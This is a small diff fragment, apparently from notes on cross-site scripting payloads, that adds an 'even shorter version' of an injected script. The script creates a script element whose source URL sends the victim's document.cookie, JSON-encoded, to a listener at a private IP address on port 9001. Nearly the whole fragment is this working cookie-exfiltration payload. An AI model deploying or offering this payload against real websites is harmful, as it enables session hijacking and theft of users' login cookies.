@@ -24,6 +24,7 @@ Same as:
         document.head.appendChild(script);
     </script>
 
+Even shorter version:
     <script>
         document.head.appendChild(document.createElement('script')).src = `http://192.168.140.129:9001/?data=${encodeURIComponent(JSON.stringify({ message: document.cookie }))}`;
     </script>
